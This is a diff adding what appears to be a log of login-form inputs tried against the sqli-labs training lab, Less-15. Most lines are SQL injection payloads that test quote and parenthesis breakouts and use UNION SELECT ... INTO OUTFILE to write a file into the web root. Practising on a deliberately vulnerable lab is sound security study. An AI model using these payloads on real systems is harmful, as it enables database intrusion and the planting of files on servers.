@@ -1,0 +1,24 @@
+User Name:\Password:
+User Name:\Password:
+User Name:' union select 1,2  into '/var/www/html/sqli-labs/Less-15/u.txt' #Password:
+User Name:" union select 1,2  into '/var/www/html/sqli-labs/Less-15/u.txt' #Password:
+User Name:") union select 1,2  into '/var/www/html/sqli-labs/Less-15/u.txt' #Password:
+User Name:') union select 1,2  into '/var/www/html/sqli-labs/Less-15/u.txt' #Password:
+User Name:')) union select 1,2  into '/var/www/html/sqli-labs/Less-15/u.txt' #Password:
+User Name:")) union select 1,2  into '/var/www/html/sqli-labs/Less-15/u.txt' #Password:
+User Name: union select 1,2  into '/var/www/html/sqli-labs/Less-15/u.txt' #Password:
+User Name:') union select 1,2  into '/var/www/html/sqli-labs/Less-15/u.txt' #Password:
+User Name:')) union select 1,2  into '/var/www/html/sqli-labs/Less-15/u.txt' #Password:
+User Name:" union select 1,2  into '/var/www/html/sqli-labs/Less-15/u.txt' #Password:
+User Name:") union select 1,2  into '/var/www/html/sqli-labs/Less-15/u.txt' #Password:
+User Name:")) union select 1,2  into '/var/www/html/sqli-labs/Less-15/u.txt' #Password:
+User Name:union select 1,2  into '/var/www/html/sqli-labs/Less-15/u.txt' #Password:
+User Name:' union select 1,2  into '/var/www/html/sqli-labs/Less-15/u.txt' #Password:
+User Name:' union select 1,2  into '/var/www/html/sqli-labs/Less-15/u.txt'  # Password:
+User Name:' union select 1,2  into '/var/www/html/sqli-labs/Less-15/u.txt'  #Password:
+User Name:' union select 1,2  into "/var/www/html/sqli-labs/Less-15/u.txt"  #Password:
+User Name:Password:
+User Name:Password:
+User Name:Password:
+User Name:\Password:
+User Name:' union select 3,2  into outfile '/var/www/html/sqli-labs/Less-15/u.txt'  #Password:
